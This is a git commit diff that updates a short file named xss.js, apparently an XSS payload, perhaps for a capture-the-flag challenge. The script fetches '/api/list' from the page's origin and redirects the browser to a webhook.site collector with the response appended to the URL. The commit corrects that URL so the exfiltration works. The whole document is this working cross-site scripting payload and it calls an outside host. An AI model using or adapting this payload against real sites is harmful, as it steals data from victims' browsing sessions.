2c6bb1ba0acdde0079028e7bfbe3d818ff330249
shahirsu <62285063+shahirsu@users.noreply.github.com>
2024-02-08 19:21:16 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,2 @@
 fetch('/api/list').then(r=>r.text())
-        .then(r=>location = "https://webhook.site/#!/view/19a77aa6-a445-47eb-9ae2-05a1d74c00e4/meow?c="+r)
+        .then(r=>location = "https://webhook.site/19a77aa6-a445-47eb-9ae2-05a1d74c00e4/meow?c="+r)
